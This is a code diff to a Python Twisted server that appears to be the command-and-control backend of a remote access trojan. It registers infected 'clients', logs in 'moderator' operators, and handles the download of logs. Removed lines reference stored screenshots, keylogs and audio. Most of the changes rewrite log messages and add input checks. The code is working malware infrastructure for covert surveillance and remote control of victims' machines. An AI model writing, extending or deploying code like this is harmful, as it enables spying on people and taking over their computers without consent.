@@ -16,61 +16,49 @@ class ModeratServerProtocol(LineReceiver):
     delimiter = '[ENDOFMESSAGE]'
     MAX_LENGTH = 1024 * 1024 * 100  # 100MB
 
-    def __init__(self):
-
-        # dicts for download
-        self.screenshots_dict = {}
-        self.keylogs_dict = {}
-        self.audio_dict = {}
-
     def rawDataReceived(self, data):
         pass
 
-    # New Connection Made
     def connectionMade(self):
         self.sendMessage(self, 'connectSuccess', 'connectSuccess')
 
     def connectionLost(self, reason):
-        self.transport.abortConnection()
-
-        # Delete Client Entry
         for key, value in self.factory.clients.items():
             if value['protocol'] == self:
                 self.factory.database.setClientStatus(key, False)
                 del self.factory.clients[key]
                 self.factory.log.warning('[CLIENT] Client (%s) Disconnected' % (value['key'] if value.has_key('key') else 'UNKNOWN'))
-
-        # Delete Moderator Entry
-        try:
-            for key, value in self.factory.moderators.items():
-                if value['protocol'] == self:
-                    # Set Moderator Offline
-                    self.factory.database.setModeratorLastOnline(value['username'])
-                    self.factory.database.setModeratorStatus(value['username'], False)
-                    self.factory.log.warning('[MODERATOR] Moderator (%s) Disconnected' % value['username'])
-                    del self.factory.moderators[key]
-        except KeyError:
-            pass
+        for key, value in self.factory.moderators.items():
+            if value['protocol'] == self:
+                # Set Moderator Offline
+                self.factory.database.setModeratorLastOnline(value['username'])
+                self.factory.database.setModeratorStatus(value['username'], False)
+                self.factory.log.warning('[MODERATOR] Moderator (%s) Disconnected' % value['username'])
+                del self.factory.moderators[key]
 
     def lineLengthExceeded(self, line):
-        self.factory.log.warning('[SERVER] Data Length Exceeded from {}'.format(ipAddress))
+        self.factory.log.warning('[SERVER] Data Length Exceeded From {}'.format(self.transport.getPeer().host))
 
     def lineReceived(self, line):
         try:
-            command = ast.literal_eval(line)
+            dataDict = ast.literal_eval(line)
         except SyntaxError:
+            self.factory.log.warning('[MALFORMED] Bad Data Received From {}'.format(self.transport.getPeer().host))
             return
 
-        self.payload = command['payload'] if command.has_key('payload') else ''
-        self.mode = command['mode'] if command.has_key('mode') else ''
-        self.sessionID = command['session_id'] if command.has_key('session_id') else ''
-        self.moduleID = command['module_id'] if command.has_key('module_id') else ''
-        self.clientKey = command['key'] if command.has_key('key') else ''
+        self.payload = dataDict['payload'] if dataDict.has_key('payload') else ''
+        self.mode = dataDict['mode'] if dataDict.has_key('mode') else ''
+        self.sessionID = dataDict['session_id'] if dataDict.has_key('session_id') else ''
+        self.moduleID = dataDict['module_id'] if dataDict.has_key('module_id') else ''
+        self.clientKey = dataDict['key'] if dataDict.has_key('key') else ''
+        self.From = dataDict['from'] if dataDict.has_key('from') else ''
 
-        if command['from'] == 'client':
+        if self.From == 'client':
             self.clientCommands()
-        elif command['from'] == 'moderator':
+        elif self.From == 'moderator':
             self.moderatorCommands()
+        else:
+            self.factory.log.warning('[SERVER] Unrecognized Sender From {}'.format(self.transport.getPeer().host))
 
     def clientCommands(self):
         ipAddress = self.transport.getPeer().host
@@ -80,12 +68,12 @@ class ModeratServerProtocol(LineReceiver):
             del Source
 
         elif self.mode == 'buildClientError':
-            self.factory.log.warning('[ERROR*] [IP: {0}] [ERRMSG: {1}'.format(ipAddress, self.payload))
+            self.factory.log.warning('[CLIENT] [IP: {0}] [ERRMSG: {1}'.format(ipAddress, self.payload))
 
         elif self.mode == 'clientInitializing':
             if self.payload == 'noKey':
                 client_id = id.generator()
-                self.factory.log.debug('[*CLIENT] Generate New Key (%s)' % client_id)
+                self.factory.log.debug('[CLIENT] Generate New Key (%s)' % client_id)
                 self.sendMessage(self, client_id)
             else:
                 client_id = self.payload
@@ -93,7 +81,7 @@ class ModeratServerProtocol(LineReceiver):
                 'protocol': self,
                 'status': False,
             }
-            self.factory.log.debug('[*CLIENT] New Client from %s' % self.transport.getPeer())
+            self.factory.log.debug('[CLIENT] New Client from %s' % self.transport.getPeer())
             self.factory.database.createClient('admin', client_id, ipAddress)
             self.factory.database.setClientStatus(client_id, True)
 
@@ -111,7 +99,7 @@ class ModeratServerProtocol(LineReceiver):
                 }
 
         else:
-            self.factory.log.warning('[MALFORMED] Bad Mode [{}] From [{}]'.format(self.mode, self.transport.getPeer()))
+            self.factory.log.warning('[CLIENT] Bad Mode [{}] From [{}]'.format(self.mode, self.transport.getPeer()))
 
     def moderatorCommands(self):
         ipAddress = self.transport.getPeer().host
@@ -132,7 +120,7 @@ class ModeratServerProtocol(LineReceiver):
                         self.sendMessage(self, 'loginError')
                         self.factory.log.error('[MODERATOR] Moderator (%s) Login Error' % username)
                 else:
-                    self.factory.log.critical('[MALFORMED] Moderator Login Data')
+                    self.factory.log.critical('[MODERATOR] Moderator Login Data')
 
         elif self.factory.moderators.has_key(self.sessionID):
             moderator = self.factory.database.getModerator(self.factory.moderators[self.sessionID]['username'])
@@ -156,7 +144,7 @@ class ModeratServerProtocol(LineReceiver):
                         moderator.username, alias_value, ipAddress))
                     self.factory.database.setClientAlias(alias_client, alias_value)
                 except:
-                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, self.mode))
+                    self.factory.log.critical('[MODERATOR][{0}] Malformed Credentials [MODE: {1}]'.format(moderator.username, self.mode))
 
             elif self.mode == 'removeClient':
                 client = self.payload
@@ -184,7 +172,7 @@ class ModeratServerProtocol(LineReceiver):
 
                     self.sendMessage(self, counted_data)
                 else:
-                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))
+                    self.factory.log.warning('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))
 
             elif self.mode == 'downloadLogs':
                 if type(payload) == dict:
@@ -315,9 +303,9 @@ class ModeratServerProtocol(LineReceiver):
                 except KeyError as e:
                     pass
             else:
-                self.factory.log.critical('[MALFORMED][MODE] [MODE: {0}] [MODERATOR: {1}]'.format(self.mode, moderator.username))
+                self.factory.log.warning('[MODERATOR] Malformed Mode [{0}] From [{1}]'.format(self.mode, moderator.username))
         else:
-            self.factory.log.critical('[MALFORMED][SESSION] [MODE: {0}] [SESSION: {1}]'.format(self.mode, self.session_id))
+            self.factory.log.warning('[MODERATOR] Invalid Session [{0}] From [{1}]'.format(self.sessionID, ipAddress))
 
     def sendMessage(self, to, message, mode='', sessionID='', moduleID=''):
         toAddress = to.transport.getPeer().host
@@ -329,8 +317,8 @@ class ModeratServerProtocol(LineReceiver):
             'session_id': self.sessionID if hasattr(self, 'sessionID') else sessionID,
             'module_id': self.moduleID if hasattr(self, 'moduleID') else moduleID,
         }))
-        self.factory.log.info('[*SENT] [TO: %s] [FROM: %s] [MODE: %s]' % (
-            toAddress, fromAddress, self.mode if hasattr(self, 'mode') else 'UNKNOUN'))
+        self.factory.log.info('[SENT>>>] [TO: %s] [FROM: %s] [MODE: %s]' % (
+            toAddress, fromAddress, self.mode if hasattr(self, 'mode') else 'UNKNOWN'))
 
 
 class ModeratServerFactory(ServerFactory):
